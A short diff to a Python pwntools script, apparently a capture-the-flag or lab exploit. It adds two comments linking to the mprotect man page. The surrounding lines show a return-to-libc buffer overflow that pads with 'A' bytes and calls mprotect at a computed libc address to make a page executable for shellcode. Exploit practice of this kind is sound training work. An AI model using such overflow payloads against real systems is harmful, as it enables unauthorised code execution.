@@ -1,3 +1,5 @@
+#Reference material: https://man7.org/linux/man-pages/man2/mprotect.2.html
+
 import requests
 import json
 from pwn import remote, u32, p32, log
@@ -42,6 +44,7 @@ def attempt_r2libc_shellcode(puts_offset, mprotect_offset):
     code_address = libc_base
     page_aligned_address = code_address & ~0xfff
 
+    #Reference material: https://man7.org/linux/man-pages/man2/mprotect.2.html
     payload = b'A' * BUFF_SIZE
     payload += p32(mprotect_offset + libc_base)
     payload += p32(MAIN_ADDR)
